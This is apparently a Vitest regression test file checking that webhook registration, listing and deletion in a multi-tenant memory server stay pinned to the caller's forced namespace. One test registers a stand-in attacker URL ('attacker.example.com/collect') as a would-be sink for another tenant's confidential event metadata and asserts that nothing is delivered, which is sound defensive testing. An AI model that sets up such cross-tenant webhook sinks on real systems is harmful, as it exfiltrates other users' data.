/**
 * battle-v16 WH-TENANCY — webhook register/list/delete must honor the forced
 * namespace (MCP_API_NAMESPACE / forcedApiNamespace). Pre-fix a pinned tenant
 * could register a NULL-namespace target (a dispatcher WILDCARD that catches
 * EVERY tenant's memory-event metadata) or a foreign-tenant target, and could
 * list + delete other tenants' targets. Post-fix the forced namespace pins all
 * three actions to the caller's own tenant.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import type Database from 'better-sqlite3';
import { createTestDb } from '../../testing/test-db.js';
import { handleWebhook } from '../../tools/webhooks.js';
import { emitMemoryEvent } from '../../events/emitter.js';
import { dispatchPendingWebhooks } from '../../events/dispatcher.js';

describe('webhook tenancy under a forced namespace', () => {
  let db: Database.Database;
  beforeEach(() => {
    db = createTestDb();
    process.env.MCP_WEBHOOKS = '1';
  });
  afterEach(() => {
    db.close();
    delete process.env.MCP_WEBHOOKS;
    vi.unstubAllGlobals();
  });

  it('register under forcing pins the namespace (no wildcard, no foreign target)', async () => {
    // Even with namespace omitted (would be NULL=wildcard) or set to a foreign
    // tenant, the forced namespace wins.
    const omitted = await handleWebhook(
      db,
      { action: 'register', url: 'https://hook.example.com/a', events: '*' },
      'tenantA',
    );
    expect((omitted.target as Record<string, unknown>).namespace).toBe('tenantA');

    const foreign = await handleWebhook(
      db,
      { action: 'register', url: 'https://hook.example.com/b', events: '*', namespace: 'tenantB' },
      'tenantA',
    );
    expect((foreign.target as Record<string, unknown>).namespace).toBe('tenantA');
  });

  it('a forced tenant does NOT receive another tenant\'s event metadata', async () => {
    // tenantA registers (namespace omitted -> would have been wildcard pre-fix).
    await handleWebhook(
      db,
      { action: 'register', url: 'https://attacker.example.com/collect', events: '*' },
      'tenantA',
    );
    // tenantB writes a confidential memory.
    emitMemoryEvent(db, 'memory.created', {
      id: 'tenantB-secret', scope: 'project', namespace: 'tenantB',
      access_level: 'confidential', agent_id: 'tenantB-agent', version: 1,
    });

    const sent: Array<{ url: string; body: string }> = [];
    const fetchImpl = (async (url: string, init: RequestInit) => {
      sent.push({ url: String(url), body: String(init.body) });
      return { ok: true, status: 200 } as Response;
    }) as typeof fetch;
    const lookup = async () => [{ address: '93.184.216.34' }];
    const result = await dispatchPendingWebhooks(db, { fetchImpl, lookup, now: new Date(Date.now() + 60_000) });

    // No delivery: the tenantA target's namespace is pinned to tenantA, so the
    // tenantB event does not match it.
    expect(result.delivered).toBe(0);
    expect(sent).toHaveLength(0);
  });

  it('a pre-existing NULL-namespace wildcard target receives NO foreign events under forcing (WH-2)', async () => {
    // A wildcard target registered while UNFORCED (namespace omitted -> NULL).
    delete process.env.MCP_API_NAMESPACE;
    await handleWebhook(db, { action: 'register', url: 'https://legacy-wildcard.example.com/sink', events: '*' });

    // Forcing is now ON (tenantA). tenantA writes, tenantB writes.
    process.env.MCP_API_NAMESPACE = 'tenantA';
    try {
      emitMemoryEvent(db, 'memory.created', { id: 'a1', scope: 'project', namespace: 'tenantA', version: 1 });
      // A foreign write would only originate from tenantB's own (tenantB-forced)
      // process; simulate its emit by switching the pin for the emit call.
      process.env.MCP_API_NAMESPACE = 'tenantB';
      emitMemoryEvent(db, 'memory.created', { id: 'b1', scope: 'project', namespace: 'tenantB', version: 1 });
      process.env.MCP_API_NAMESPACE = 'tenantA';

      const sent: string[] = [];
      const fetchImpl = (async (url: string) => { sent.push(String(url)); return { ok: true, status: 200 } as Response; }) as typeof fetch;
      const lookup = async () => [{ address: '93.184.216.34' }];
      const res = await dispatchPendingWebhooks(db, { fetchImpl, lookup, now: new Date(Date.now() + 60_000) });

      // The wildcard's namespace (NULL) never equals a forced namespace, so NO
      // event was enqueued to it from either tenant's pinned process.
      expect(res.delivered).toBe(0);
      expect(sent).toHaveLength(0);
    } finally {
      delete process.env.MCP_API_NAMESPACE;
    }
  });

  it('list + delete are scoped to the forced tenant', async () => {
    // tenantB registers a private target (via its own pinned instance).
    const tb = await handleWebhook(
      db,
      { action: 'register', url: 'https://tenantB-internal.example.com/hook', events: '*' },
      'tenantB',
    );
    const tbId = (tb.target as Record<string, unknown>).id as string;

    // tenantA lists — must NOT see tenantB's target.
    const listed = await handleWebhook(db, { action: 'list' }, 'tenantA');
    const urls = (listed.targets as Array<Record<string, unknown>>).map((t) => String(t.url));
    expect(urls.some((u) => u.includes('tenantB-internal'))).toBe(false);

    // tenantA tries to delete tenantB's target by id — refused (not owned).
    const del = await handleWebhook(db, { action: 'delete', id: tbId }, 'tenantA');
    expect(del.deleted).toBe(false);
    const stillThere = db
      .prepare('SELECT COUNT(*) AS n FROM webhook_targets WHERE id = ?')
      .get(tbId) as { n: number };
    expect(stillThere.n).toBe(1);
  });
});
